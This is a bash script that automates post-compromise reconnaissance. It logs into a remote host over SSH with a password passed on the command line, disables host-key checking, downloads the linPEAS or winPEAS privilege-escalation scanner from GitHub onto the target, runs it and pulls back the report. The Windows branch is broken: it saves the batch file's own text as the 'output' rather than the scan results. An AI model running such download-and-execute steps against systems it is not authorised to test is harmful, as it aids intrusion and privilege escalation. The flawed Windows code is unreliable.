#!/bin/bash

# Usage function to display help for the hapless user
usage() {
  echo "Usage: $0 -u <username> -h <host> -p <port> -w <password>"
  exit 1
}

# Parse command-line arguments
while getopts ":u:h:p:w:" opt; do
  case ${opt} in
    u )
      USER=$OPTARG
      ;;
    h )
      HOST=$OPTARG
      ;;
    p )
      PORT=$OPTARG
      ;;
    w )
      PASSWORD=$OPTARG
      ;;
    \? )
      usage
      ;;
  esac
done

if [ -z "${USER}" ] || [ -z "${HOST}" ] || [ -z "${PORT}" ] || [ -z "${PASSWORD}" ]; then
    usage
fi

# Get current date and time
CURRENT_DATETIME=$(date +'%Y-%m-%d_%H-%M-%S')

# Function to determine the OS of the remote machine
get_os() {
    sshpass -p ${PASSWORD} ssh -o StrictHostKeyChecking=no -p ${PORT} ${USER}@${HOST} 'uname -s'
}

# Function to download and execute linpeas on a Linux system
run_linpeas() {
    OUTPUT_FILE="linpeas_output_${CURRENT_DATETIME}.txt"
    sshpass -p ${PASSWORD} ssh -o StrictHostKeyChecking=no -p ${PORT} ${USER}@${HOST} << EOF
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
EOF
    sshpass -p ${PASSWORD} scp -P ${PORT} ${USER}@${HOST}:/tmp/linpeas_output.txt ${OUTPUT_FILE}
}

# Function to download and execute winPEAS on a Windows system
run_winpeas() {
    OUTPUT_FILE="winpeas_output_${CURRENT_DATETIME}.txt"
    sshpass -p ${PASSWORD} ssh -o StrictHostKeyChecking=no -p ${PORT} ${USER}@${HOST} << EOF
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -OutFile C:\Windows\Temp\winPEAS.bat; Start-Process C:\Windows\Temp\winPEAS.bat -NoNewWindow -Wait; Get-Content C:\Windows\Temp\winPEAS.bat -Raw | Out-File -FilePath C:\Windows\Temp\winpeas_output.txt"
EOF
    sshpass -p ${PASSWORD} scp -P ${PORT} ${USER}@${HOST}:C:/Windows/Temp/winpeas_output.txt ${OUTPUT_FILE}
}

# Determine the OS of the remote machine
OS=$(get_os)

# Execute the appropriate PEAS version based on the OS
if [[ "$OS" == "Linux" ]]; then
  echo "Linux detected. Running linpeas..."
  run_linpeas
elif [[ "$OS" == "MINGW"* || "$OS" == "CYGWIN"* || "$OS" == "Windows"* ]]; then
  echo "Windows detected. Running winpeas..."
  run_winpeas
else
  echo "Unsupported OS: $OS"
  exit 1
fi
